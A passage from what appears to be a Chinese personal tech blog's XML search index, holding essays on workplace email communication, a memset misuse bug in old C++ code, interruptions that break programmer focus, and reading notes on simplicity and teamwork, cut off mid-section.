href="http://mannix.top/2018/11/25/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7%E9%9B%86%E5%90%88/">渗透测试常用工具集合</a></li></ul><hr><h2 id="资源下载"><a href="#资源下载" class="headerlink" title="资源下载"></a>资源下载</h2><blockquote><p><a href="https://share.weiyun.com/5eRmvxa">腾讯微云（密码：mpgksn）</a></p></blockquote><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 白帽子 </tag>
            
            <tag> Pwk </tag>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你难道没收到我的邮件？</title>
      <link href="/articles/insights/ni-nan-dao-mei-shou-dao-wo-de-you-jian/"/>
      <url>/articles/insights/ni-nan-dao-mei-shou-dao-wo-de-you-jian/</url>
      
        <content type="html"><![CDATA[<p>细数公司十大经典金句之首，当孰【你难道没收到我的邮件？】无疑（了吧~ 我发誓我木有统计过）——尤其是邮件作为我们公司主要的沟通手段之一，我对这句话可谓印象深刻了。</p><p>回想刚到公司的时候，我还不会打座机电话（我承认我真的去学了打电话…），当时跟工程同事唯一的沟通手段就是邮件，有时甚至把邮件当QQ用了。但毕竟邮件不是QQ，时效性略差。有时候一些问题得不到确认，于是事后问对方最多的就是你有没有收到我的邮件了。</p><p>通常情况下，我们大部分人都有一个认知误区：只要把邮件发给对方了，对方就一定会知晓并执行，于是自己的沟通任务就完成了。但事实是，对方很可能没有（及时）收到邮件，即使收到了邮件，也不代表能够理解、接受、甚至执行。</p><p><img src="./01.png"></p><p>沟通并不仅仅是发送邮件那么简单——发送邮件不过是沟通手段的一种，切莫把沟通手段和沟通过程混淆了。</p><p>真正意义上的沟通，是指思想碰撞并传递的过程。只有我和你能够以相同的角度去看待某个问题、理解其细节，才能说我和你完成了沟通。否则即使你清楚明白地看到了（听到了）我的每字每句，但是你不理解我的意思，那我和你也没有做任何有实际意义的沟通。</p><p>邮件上的沟通，按我们通常的说法，充其量只是“存证式的沟通”。确实它可以作为沟通证据，但过于依赖邮件则可能造成沟通障碍——尤其是当邮件包含的信息量越大，其中的细节就越容易被忽略。</p><p>况且信息淹没只是沟通障碍的一种。文化背景、个人偏见等主观因素也会成为沟通障碍的帮凶。为了减少类似不必要的障碍，我现在工作的时候，更倾向于面对面的、或电话式的交流，同时我也会定期写一些文章，借此向身边的人表述我近期的观点或见闻——我觉得消除障碍最好的方法就是让别人可以更直接地了解自己。</p><p>我越来越觉得，当一个问题被过于依赖用邮件去处理时候，处理周期越长，它就像抛绣球似得被抛来抛去。多用面对面或电话式的沟通，则可以促使我们在当下通过讨论去解决、反思问题。而写文章则可以避免直面的尴尬，在特定的时期向其他人表述自己的观点。</p><p>实际上，我一直以来都有写文章的习惯，而且我有自己的Blog。但自从去年开始公司办了内刊，我就把本应发表去Blog的一部分文章改投放到公司内刊了。原因有二：一是可以令身边的人更了解我的想法，增强他人对自己的熟悉感会利于平时沟通；二是我更喜欢公司有个人可以帮我对文章把关，使我的文笔有所提升——我并不介意文章被挑剔，因为我始终相信：“谁越是对你的文笔斤斤计较，谁就越可能是决定你前途的人”。</p><p>但沟通不仅仅相互理解、消除障碍就足够了。沟通也是需要策略的，首要一条就是让对方可以听懂并接受的方式去表述，否则只会徒增对方的失落感、甚至乎反感。其次就是用可以吸引对方注意力的方式去表述——我相信相比起一本新书，遍布重点的参考书更有吸引力，尤其在考试前。</p><p>最后我需要声明的是，写下这篇文章，并不是说邮件沟通有什么不好。恰恰相反，邮件作为“存证式”的沟通手段，是其他沟通方式不能替代的。而之所以用邮件说明问题，不过是作为这篇劣文一个引子，我真正所倡导的，是灵活、有效的沟通过程——这才是我们需要的——我们大可以在完成沟通后，再用邮件来存证一下不是么？</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 沟通 </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找 BUG 记</title>
      <link href="/articles/insights/zhao-bug-ji/"/>
      <url>/articles/insights/zhao-bug-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="令人头痛的陈年老BUG（序章）"><a href="#令人头痛的陈年老BUG（序章）" class="headerlink" title="令人头痛的陈年老BUG（序章）"></a>令人头痛的陈年老BUG（序章）</h2><p>前几天，码农朋友甲（下文简称“甲”）拿着我5年前发表在某博文的代码问我：“这段代码是有bug吧？”下面就是他给我指出来的一段C++代码，大家可以先尝试能不能找到甲看到的bug：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">Initial</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    TimeStamp <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>              <span class="token comment" spellcheck="true">// 时间戳</span>    DFN <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 搜索次序</span>    Low <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 能够回溯的最早次序号</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>DFN<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>Low<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    SCC_id <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    SCC <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 辅助栈</span>    Status <span class="token operator">=</span> new <span class="token keyword">int</span><span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 辅助栈状态</span>    <span class="token function">setIntArrayVal</span><span class="token punctuation">(</span>Status<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sp <span class="token operator">=</span> new Shrink_point<span class="token punctuation">[</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 缩点（极大强连通分量）</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">setIntArrayVal</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>诚然，突然要我查一段几年前写下的代码是否有bug，我内心是比较抗拒的——尤其是我自己写的代码（我对自己还是有相当自信的）——毕竟人的弱点就是不善于揭发自己的短处。不过这都只是次要的心理因素。</p><p>归根结底，所谓打铁趁热，bug也是越早发现越好，**<em>新代码的bug总是要比历史代码的bug更容易处理**</em>。而面对这个陈年老bug，我已经完全忘记了我在5年前写这段代码的思绪，所以要我马上就应付甲的质疑是不可能的。与其再花费一番周折琢磨我自己的代码，我干脆直接就举手投问：“所有测试用例运行可以通过，是哪里有bug呢？”</p><h2 id="因注释而蔓延"><a href="#因注释而蔓延" class="headerlink" title="因注释而蔓延"></a>因注释而蔓延</h2><p>甲告诉我，是memset函数使用错误：在C++中，函数memset的作用是对一段连续的内存块赋值，即赋值的单位是字节，换而言之memset只能用于字节数组，但int数组不是字节数组。</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> solve<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">setIntArrayVal</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token operator">*</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">memset</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> val<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">*</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>老实说，我很高兴甲会如此仔细的看我5年前的代码。而且毫无疑问，他的观点是正确的。但是也不见得我就是错的。因为早在那时我就已经知道memset函数的局限所在，但我坚持要用这个函数做数组的初始化，是因为我看中了它的效率——</p><p>相对于逐个赋值的方法初始化数组元素、memset的效率要高得多，因为从寻址次数来看，前者的时间复杂度是O(n)、后者是O(1)，更何况当时所解决问题的n是上千万级别的。虽然我把memset用在非字节数组，只要我保证初始化的值只为0就不会有任何问题。事实上也是如此。</p><p>于是我自信满满地告诉甲，单纯断章取义地看我这个方法，确实是一个bug。但如果整体地去看我的代码就恰恰相反，**<em>我只是利用了bug，并得到了更高效的处理**</em>。</p><p>但是甲之后的一席话确实值得我深思：</p><p>“或许对目前的这份代码而言，这个bug是被你巧妙地利用了，但是我觉得**<em>真正的bug或许不是你的代码，而是你没有文字注释去说明你的想法**</em>。不要忘记你已经共享了你的代码，当更多人看到这段程序时，如果他们不了解menset的原理就照样搬用，那么你就无异于在别人的代码中散播了bug，因为你不能把他们代码中的val限制为0。”</p><h2 id="最危险的组合"><a href="#最危险的组合" class="headerlink" title="最危险的组合"></a>最危险的组合</h2><p>不得不承认，甲是对的。即使我有足够的自信在5年后仍然记得利用这个bug的前因后果，但在这5年间早已误了不少别人的子弟……</p><p>不过话说回来，先不论这个bug的蔓延性，甲能够如此深入琢磨我的历史遗留物、并发现这个bug实属难得——在软件中有一种bug是最难被发现的：组合式的bug。组合式的bug有两种类型：相辅相成型、相互弥补型——甲在我代码中发现的bug就属于后者。</p><p>相辅相成型：举例而言，一个bug是楼梯很滑，另一个bug扶手坏了，但除非这两个bug同时存在，否则只有其中一个bug是不足以让人摔下楼梯的。</p><p>相互弥补型：它与相辅相成型刚好相反，只有两个bug同时存在（或不存在）程序才会正常运行。若只修正了其中一个bug，另一个bug就会曝露出来，而且会让人有误以为自己改错了的假象，因为修改之前程序是可以正常运行的。</p><p>之所以说它难以发现，因为组合bug几乎无迹可寻，尤其是相互弥补型。除非是编译原理的狂热爱好者、抑或出现了非常极端的运行环境。**<em>存在组合bug的程序，其通常状态无异于正常程序，而且可能正常运行了很长时间都没有曝露出来**</em>。</p><p>回到我的代码，它已经正常运行5年了。如果甲没有向我质问他心中的疑惑，而是擅自修改了他所发现的bug，那么我的程序就无法正常运行了——而甲就很可能会因此陷入怀疑自己的正确性的境地。</p><h2 id="令人头痛的陈年老BUG（终章）"><a href="#令人头痛的陈年老BUG（终章）" class="headerlink" title="令人头痛的陈年老BUG（终章）"></a>令人头痛的陈年老BUG（终章）</h2><p>事实上，不是所有bug都需要解决掉的。很多时候我们明明知道正在为代码引入一个bug，但是我们却依然保留它。因为回避它的代价太大了，我们宁愿限制它的前提条件不让它轻易发生、或者将其“圈养”起来（如try-catch）不让它暴走——**<em>如何容忍bug也是一门学问**</em>。</p><p>不过也总有一些技术葩喜欢另辟蹊径，誓言要代表月亮消灭所有bug维护代码界安全——先不说甲就是这种人，反正我是不会去消灭一个几年前就已经知道的bug的。如果要消灭它，我当时就做了，何必等到现在。</p><p>这前面提到的“新bug更易于旧bug被解决”是一个原因，但我真正担忧的是我或许会引入更多不可控的bug——代码的历史太久远了，我已经近乎忘记了它的逻辑，我一旦盲目修改，完全有可能采用了更危险的方法去解决那个稳定了5年的bug。</p><p>很多时候，我们写完一段代码，只要程序能够编译运行、完成需求功能就算完成了，鲜有考究bug的可能性，大部分的bug都是通过日后使用时再去发现和解决的。其实解决bug的黄金时间在于代码刚被编写的时候，这时候我们往往只需看到异常提示，就可以马上定位异常原因，因为潜意识中我们已经隐约觉得哪个位置会报什么异常了。</p><p>所以当我们在面对一些陈年老bug的时候，其实早就已经错过了解决它的最好时机。这时候不妨将其圈养起来，可能相比于消灭它，会令代码更安全。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> BUG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>请还我安静的 4 小时</title>
      <link href="/articles/insights/qing-huan-wo-an-jing-de-4-xiao-shi/"/>
      <url>/articles/insights/qing-huan-wo-an-jing-de-4-xiao-shi/</url>
      
        <content type="html"><![CDATA[<p>我大概总结了我每天分配的工作时间，一般情况下，我是这样汇报我的工作情况的：</p><p><img src="./01.png" alt="我理想中的工作时间表"></p><p>实际上，我的工作情况却可能是这样的：</p><p><img src="./02.png" alt="我现实中的工作时间表"></p><p>表面看来，这两个时间表所完成的工作内容是一模一样的，而且第一个时间表似乎可以更清晰地表述我一天的工作情况。但是它却无法反映出我的困扰：正如第二个凌乱的时间表所示——我的工作实际上是由无数的时间碎片构成的，而我们大部分人可能早已习惯了这个不正常的时间表。</p><p>通常，管理者为了更有效率地利用时间，他们很擅长在同一个时间处理多个问题，因为这可以体现出他们处事的应变能力。但我们程序员则更倾向于能够专注地做一件事：同样一件事，相比于断断续续地做4小时，专心地连续做4小时的效率要高得多。工作本就贵在专注，而一旦那种专注的状态被破坏，要恢复这种状态非但不易、而且还会白白浪费很多时间。</p><p>大家曾经都可能玩过一个堆纸牌金字塔的游戏，越想要砌得高、所需要的专注时间越长： </p><p><img src="./03.png"></p><p>程序员开发软件，就好比堆纸牌的过程，想要迅速稳固，那么从开始到完成必须一气呵成，中途不能受到一丝打扰，否则整座金字塔都会散架，只能重头开始。</p><p>开发好的软件需要投入大量的精神时间，没有一段时间的酝酿是无法开展工作的。有时我们好不容易才有了一个构思的雏形，突如其来的打扰就会造成整个构思破产。这就是为什么每个程序员都非常讨厌在工作时被打扰的原因——可能十分钟的打扰，会多浪费我们一个小时的时间——这绝不是夸大其辞。</p><p>可惜往往事与愿违，公司绝大多数的环境都不允许我们安静地坐下来，完完全全地做自己的工作。在公司每天都有着持续不断的商讨、邮件、电话需要处理，其实这些事情很多都不是主要工作，但是因为时效性要求很高，把我们真正的工作时间变得支离破碎。</p><p>此前，我看过一篇关于 “时间是如何被浪费掉”的讨论。里面有个观点大概是说，浪费时间最危险的方式不是放纵消遣，而是花时间去“做假事”。因为当我们消遣的时候，至少知道我们在放纵自己，负罪感会让我们很快地结束这种状态。而所谓的“做假事”，是指我们在工作时间做一些非实质性的工作，例如收发邮件——花一整天的时间去处理邮件不是什么难以置信的事情，而且整个过程我们都会心安理得，因为这确实是工作。但如果过后问自己今天做了什么，我想很多人的答案基本上都是什么也没干。</p><p>我每天的工作都充斥着大量的假事。这些假事本已占用了工作时间，还因为不确定的出现时机，把主要工作的时间也掺和了。我的不少朋友都说，正是由于假事太多，导致白天在公司里根本无法静下心来做任何事情。他们宁愿选择在晚上完成主要工作，而在白天做一些次要的工作——或许这恰好也就是众多程序员都是夜猫子的成因，因为晚上没人打扰。</p><p>其实就我个人而论也是如此。我有时周末需要加班，但如非必要（如协同工作），我宁愿把工作带回去家里做。一来节省了来回公司的时间，二来效率确实比在公司高得多，往往要在公司做一天的事情，我在家里可能仅仅只需要短短的几个小时。</p><p>不过公司始终是公司，沟通交流是不可避免的一环，我们无法改变这个大环境，唯有从自身作要求，首先从不频繁地打扰别人做起，希望由此可以慢慢形成一种氛围——借由提供别人安静的工作环境，换取自己安静的工作环境——我要求不高，还我安静的3 - 4小时足矣。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 心路历程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>半杯水</title>
      <link href="/articles/insights/ban-bei-shui/"/>
      <url>/articles/insights/ban-bei-shui/</url>
      
        <content type="html"><![CDATA[<blockquote><p>读 《<a href="https://book.douban.com/subject/6709809/">暗时间</a>》 有感</p></blockquote><h2 id="这应该算是引子"><a href="#这应该算是引子" class="headerlink" title="这应该算是引子"></a>这应该算是引子</h2><p>半杯水 —— 思如杯，技如水，技盈则满，思盈则空。虚而不满，似无物，可容万物。</p><p>有一个辩题为「能力和思维哪个更重要」。我不选边站，「学而不思则惘，思而不学则怠」，物极必反是亘古之理。只是现在社会的竞争过大，很多人为了眼下的生活，都过份追求自身能力的发展，而忽略了不时反思自身的那份态度。</p><p>我之前问过一个海纳百川的朋友：「你什么新技能都去试，也不想想学得多而不精有什么用？」 于是他告诉我，这样才能在短时间内让上司知道自己有什么变化，而且新东西可以显得自己与众不同。</p><p>我想说，其实如果你可以坚持每天不穿衣服去上班，也是可以起到同样效果的…… 同理，我也不认为一味思考人生就会变得很好，当然如果你想成为下一个「深井冰」，那就另当别论了。</p><p>其实辩题不应该是哪个更重要，因为都重要。关键是如何在两者之间寻求平衡，保持半杯水的「状态」 —— 但我更倾向于认为这是种互补的「心态」：不过分依赖能力、也不过分依赖思考，不过分依赖自己、也不过分依赖他人，为身边的一切寻求互补，不卑不亢，聪明地做事。</p><h2 id="分节目录"><a href="#分节目录" class="headerlink" title="分节目录"></a>分节目录</h2><table><thead><tr><th align="left">-</th><th align="left">-</th></tr></thead><tbody><tr><td align="left">●  苦逼程序猿，劳模运维狮</td><td align="left">—— 工作怪圈</td></tr><tr><td align="left">●  你需要K.I.S.S</td><td align="left">—— 跳出怪圈（程序猿篇）</td></tr><tr><td align="left">●  掌控你的资源</td><td align="left">—— 跳出怪圈（运维狮篇）</td></tr><tr><td align="left">●  能力与方法</td><td align="left">—— 正确地使用你的能力</td></tr><tr><td align="left">●  囚徒困境</td><td align="left">—— 别宅了，抱团吧</td></tr><tr><td align="left">●  人的核心竞争力</td><td align="left">—— 技能不是万能</td></tr><tr><td align="left">●  书写是为了更好地思考</td><td align="left">—— 你的思维需要降速</td></tr></tbody></table><h2 id="苦逼程序猿，劳模运维狮"><a href="#苦逼程序猿，劳模运维狮" class="headerlink" title="苦逼程序猿，劳模运维狮"></a>苦逼程序猿，劳模运维狮</h2><p>对程序猿而言，「重构」永远是最大的课题。</p><p>程序猿最困扰的，莫过于总要面对一堆乱七八糟的历史代码 —— 历史代码其本身可能并不混乱，只是经手的人多了，面目全非罢了。从心理上看，一份代码越混乱，对于维护结果抱着「无所谓」的心态越明显。但不负责任的恶性维护，尽头只能是重构，而即使重构了，却也只是新循环的开始。</p><p>而对于运维狮，「自动」应是他们最终所追求的幻想。</p><p>运维狮的工作核心基本无一例外的就是要面对大量的机器、大量的程序副本、不知何时会崩坏的线程，还要时常排查天文数字一样的监控数据，到头来却不知道自己究竟在维护什么。</p><p>即使渴望可以自动化完成这一切，但「羊群效应」却使得大多数运维狮无意识地从众，因为有安全感的，尤其所面对的东西是未知的时候 —— 既然已经有那么多非自动化部署的程序 …… 于是又手动拷贝了一份程序副本。</p><p>我们总是在嘲笑历史上的别人留下一堆麻烦，历史却总是惊人的相似 —— 因为我们在抱怨别人的烂摊子的同时，一边给别人制造烂摊子却不自知。若始终不肯抛弃「自我感觉良好」的心态，所有人都只能苦逼地活在别人制造的圈子里，然后成为别人嘲笑的劳模。这个循环是时候结束了。</p><h2 id="你需要K-I-S-S"><a href="#你需要K-I-S-S" class="headerlink" title="你需要K.I.S.S"></a>你需要K.I.S.S</h2><p>首先要声明的是，不要理会别人的维护质量有多烂，从自身做起，保持良好的心态，负责任地维护每一份代码才是一个程序猿应有的职业素质。</p><p>但是总有一些代码经过历史不断的修补而变得过于复杂，复杂到我们宁愿放弃80%的功能（这并不是确切的划分，只是我深受二八定律影响罢了）去重构一份简洁的代码 —— 当然如果还有保有我们所需要的那些功能就更好了。</p><p>良好的开端比什么都重要。程序猿觉得代码维护困难，根本原因在于程序设计阶段没有做好。所以无论如何，只要你一下定决心要重构，请务必由始至终把K.I.S.S原则铭记在心。K.I.S.S，即「Keep it simple,stupid!」，直译过来就是「保持简单，傻瓜」。确实，把程序复杂化无助于性能和资源的管控，也使得后续的使用和维护更加困难。</p><p>有一条程序猿悖论如是说：「程序猿的工作效率并不会随着资历的增加而有显著提高」。究其原因，年轻的程序猿会耗费大量的工作时间去敲写几万行代码以体现能力；而老程序猿更倾向于在深入思考后再写出几百行代码以体现质量，即使偶尔花了大量时间在写代码上，一般也只是为了这几百行代码找到最优的组合而已。</p><p>这是因为所有老程序猿都明白，华而不实的工作能力，只会使我们的工作变得更加困难。只有简单才是美，为了简单我们不惜付出任何代价。</p><h2 id="掌控你的资源"><a href="#掌控你的资源" class="headerlink" title="掌控你的资源"></a>掌控你的资源</h2><p>相对于程序猿，运维狮没有推翻一切重来的「重构」手段，因此需要的更多是务实的精神，但务实不等同于蛮干，技巧也很重要。一个合格的运维狮应该思考的不是「能做多少」，而是「如何做得最少」。</p><p>如果你觉得维护工作开始变得困难，或者已经很困难，就需要审视自己是否有正确利用身边的资源以提高自身的工作效率和质量。不要奢望「自家的」程序猿什么时候能提供自动化的程序使你的工作变得轻松，关注第三方的运维工具并利用起来才是王道，毕竟现在的社会，什么东西都是「别人家的」更好啊。</p><p>有一条成功的箴言如是说：「要看一个人是否成功，看他晚上8点之后在干什么」。其实也是很浅显的道理，白天谋生、晚上谋事。作为运维狮，虽然少有晚上时间，但闲下来的时候必须学会充实自己。如果你还在迷茫应该学习什么，或者我能够为你指两个方向：</p><ul><li>掌握shell/sed/awk三剑客编程：学会编写定制化的脚本</li><li>掌握自动化部署工具ansible：用程序生成程序、而不是手工复制</li></ul><p>特别一提的是，不少运维狮容易受工作内容所限，生疏于编程语言、甚至不懂编程语言。其实不妨走出自己的圈子，学习一些编程语言，打通前后端，更有利于自身的工作。在维护出现问题的程序的时候，「知道用什么方法解决」和「知道为什么可以这样解决」是两种截然不同的境界。</p><p>这里说一个题外话，我在协助现场维护工作的时候，发现运维狮和用户之间总有争取硬件资源的矛盾。所谓「宁花机器一分，不费程序员一秒」，程序量提高了，用户却迟迟不肯放宽硬件资源，很多时候可能是没有看到有力的「证据」。如果能够做到常态化监控，并把性能数据持续集成健康的报表，对用户透明化，或许争取资源会更容易，这也是一种做事手段。</p><h2 id="能力与方法"><a href="#能力与方法" class="headerlink" title="能力与方法"></a>能力与方法</h2><blockquote><p>「如果你手里有一把锤子，所有东西看上去都像钉子」。  —— 这不是我说的。</p></blockquote><p>往往我们可能花费了大量时间去学习一项技能，而学无所用是所有人最不愿意发生的事情。于是我们就会尝试在各个方面炫耀这项新技能，而不管它是否适用。</p><p>在我学习设计模式之初，就陷入了这种状态，几乎不能自拔。确实，设计模式为我打开了一扇大门，我首次知道原来代码也可以写得如此优美，使得我迫不及待地寻找可以应用它们的项目，哪怕只有一点可以用得上。但牵强附会总是没有好结果的。</p><p>再如我现在所参与的技术框架开发，虽然一些工具组件已经被成功推广起来了，但一些工具组件却依然不为人所知。不是说这些组件没有技术性，究其原因也是适用性问题。所谓的工具是为了提高开发效率才被制造出来的，而很多同事就投诉说，为了使用一个工具必须注意这注意那，还要配置一堆有的没的东西，甚至还可能与业务逻辑不兼容，如此复杂还不如自己实现。于是他们真的选择了抛弃这些工具。</p><p>所以其实正确的做事态度应该是：「如果你想钉一个钉子，所有东西看上去都像是锤子」。</p><p>即我们在处理问题时，优先考虑的是要做什么What，而不是怎么做How。只有先明确目的，才去选择合适的工具，而不是拿着一把工具对所有事情都勉而为之。正确而有效率地做事，谨记以下几点，受用无穷：</p><ul><li>方向比努力更重要：莫要南辕北辙</li><li>流程比修补更重要：无规矩不成方圆</li><li>方法比拼命更重要：事半功倍</li></ul><h2 id="囚徒困境"><a href="#囚徒困境" class="headerlink" title="囚徒困境"></a>囚徒困境</h2><p>在信息时代，「大鱼吃小鱼」已成为过去，如今是「快鱼吃慢鱼」。但如何能够「快」？在软件开发中，如果单凭一个人在闭关修炼技术，无论学习能力多么像海绵，也不可能短时间内海纳百川，又如何能快得起来？其实这也恰好说明你开始需要一个团队了 —— 为了综合实力，取长补短。</p><p>软件开发的本质就是一项团队运动，人与人的因素对结果的影响完全不亚于技术因素。一个项目成功的关键不仅仅是写出漂亮的代码，团队中的所有人朝着同一个目标一起合作也是同样重要的。但团队工作经常遇到的问题，就是沟通问题，我遇到的主要有两种情况：不愿意沟通，或无法正确表达自己想法。</p><p>举一个博弈中的著名栗子，「囚徒困境」。大概是描述这样的一个问题：两个疑犯被隔离审讯，由于证据不足，若两个都抵赖则均判1年，两个都坦白则均判8年，一个坦白一个抵赖则坦白的释放、抵赖判10年。</p><p>从整体利益上考量，最优的方案是两者均抵赖。但由于两个疑犯不知对方所想，在对方可能会抵赖的怀疑下，局限于自身利益进行判断，都会选择坦白，以保证自身利益最大化。</p><p>囚徒困境也是在团队工作中，缺乏沟通或沟通不当的必然结果。所谓的团队任务，就是要每个人承担一块工作，分别完成后再整合。如果都只从自身角度做考量而不顾他人，即使自己工作得非常出色，但最终却无法与他人的工作完成整合，那么也只是在做无用功。</p><p>只有通过不断的沟通、磨合，才可能保证整体的利益最大化，一盘散沙，终难成事。所谓「要学做事，先学做人」，时刻谨记我们都只是半杯水：内修本领、追求极致，固然重要；外联朋志、寻求互补，方是王道 —— 抱团取暖 = 力量大。</p><h2 id="人的核心竞争力"><a href="#人的核心竞争力" class="headerlink" title="人的核心竞争力"></a>人的核心竞争力</h2><p>前面讲述的都是一些现实性的东西，那些确实都是我们用来竞争的实质性资本。但毕竟随着工作的更替，很多东西也就过时了。而不过时的只有思考的方式，或者说只有思考才真正是我们作为人的不可替代的核心竞争力。</p><p>下面这些是我平时或蒐集、或所悟的「箴言」，既然是分享，我就不要脸地「借鉴」过来了。有时这些看似与技能毫无关系的东西，可能恰好就在某个转折点决定了人生，所以都参考着看一下吧：</p><ul><li>万事先修德，养性必制怒。</li><li>广交朋友并为他们做事情。</li><li>多参与社区活动，积极分享，锻炼口才。</li><li>锻炼身体，笑到最后得有一副好身体。</li><li>反思是让人得以改进自己的最重要的思维品质。</li><li>「教」是最好的「学」。</li><li>我们都是半杯水，正是这样人生才有意义，不卑不亢，寻找互补。</li><li>人生就是一场修行，人必自助而天助之。</li><li>读书，尤其是读那些非实用性的书（如心理学等）。</li><li>潜心一到两项业余爱好，参与一些艺术活动。</li><li>不断寻找偷懒的方法，聪明地工作。</li><li>越努力，越幸运。</li><li>与智者交谈，思考，并常做笔记。</li><li>犯错趁早，防微杜渐。</li><li>因上努力，果上求缘。</li></ul><h2 id="书写是为了更好地思考"><a href="#书写是为了更好地思考" class="headerlink" title="书写是为了更好地思考"></a>书写是为了更好地思考</h2><p>最后，这是一个我自身的一个小故事。  —— 